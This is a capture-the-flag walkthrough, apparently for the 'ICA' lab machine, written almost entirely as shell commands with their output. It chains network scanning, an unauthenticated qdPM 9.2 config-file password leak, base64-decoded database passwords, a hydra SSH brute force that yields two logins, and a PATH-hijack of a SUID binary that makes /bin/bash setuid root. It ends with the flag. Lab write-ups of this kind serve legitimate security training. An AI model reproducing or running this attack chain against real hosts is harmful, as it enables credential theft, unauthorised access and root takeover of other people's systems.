## init
```bash
<>
ping -c 1 192.168.1.7

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.7 -oG allPorts
nmap -sCV -p22,80,3306,33060 192.168.1.7

whatweb http://192.168.1.7
# res
http://192.168.1.7 [200 OK] Apache[2.4.48], Bootstrap, Cookies[qdPM8], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[192.168.1.7], JQuery[1.10.2], PasswordField[login[password]], Script[text/javascript], Title[qdPM | Login], X-UA-Compatible[IE=edge]

searchsploit qdPM 9.2
# res
qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                                                                                   | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)                                                                                                                                 | php/webapps/50176.txt

searchsploit -x php/webapps/50176.txt
# res
The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download.

```

```yml

all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      profiler: false
      username: qdpmadmin
      password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
      attributes:
        quote_identifier: true  
  # 
```

```bash
mysql -uqdpmadmin -h 192.168.1.7 -p UcVQCMQk2STVeS6J

echo -n "c3VSSkFkR3dMcDhkeTNyRg==" | base64 -d ; echo

suRJAdGwLp8dy3rF # decode
X7MQkP3W29fewHdC # decode

for pass in c3VSSkFkR3dMcDhkeTNyRg== N1p3VjRxdGc0MmNtVVhHWA== WDdNUWtQM1cyOWZld0hkQw== REpjZVZ5OThXMjhZN3dMZw== Y3FObkJXQ0J5UzJEdUpTeQ==; do echo $pass; done
c3VSSkFkR3dMcDhkeTNyRg==

for pass in c3VSSkFkR3dMcDhkeTNyRg== N1p3VjRxdGc0MmNtVVhHWA== WDdNUWtQM1cyOWZld0hkQw== REpjZVZ5OThXMjhZN3dMZw== Y3FObkJXQ0J5UzJEdUpTeQ==; do echo $pass | base64 -d ; echo ; done

for pass in c3VSSkFkR3dMcDhkeTNyRg== N1p3VjRxdGc0MmNtVVhHWA== WDdNUWtQM1cyOWZld0hkQw== REpjZVZ5OThXMjhZN3dMZw== Y3FObkJXQ0J5UzJEdUpTeQ==; do echo $pass | base64 -d ; echo ; done | tee paswords # save into a file called pass

# save users too to make hydra attack

hydra -L users -P paswords ssh://192.168.1.7

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

# res
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-17 23:19:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://192.168.1.7:22/
[22][ssh] host: 192.168.1.7   login: travis   password: DJceVy98W28Y7wLg
[22][ssh] host: 192.168.1.7   login: dexter   password: 7ZwV4qtg42cmUXGX
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-17 23:19:20

ssh travis@192.168.1.7

su dexter 

find / -perm -4000 -user root 2>/dev/null

ls -l /opt/get_access

file /opt/get_access

/opt/get_access

strings /opt/get_access

cd /tmp; touch cat; chmod +x cat

echo $PATH

export PATH=/tmp:$PATH

nano cat
# in cat
chmod u+s /bin/bash

/opt/get_Access
ls -l /bin/bash

export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

bash -p

ICA{Next_Generation_Self_Renewable_Genetics}


```
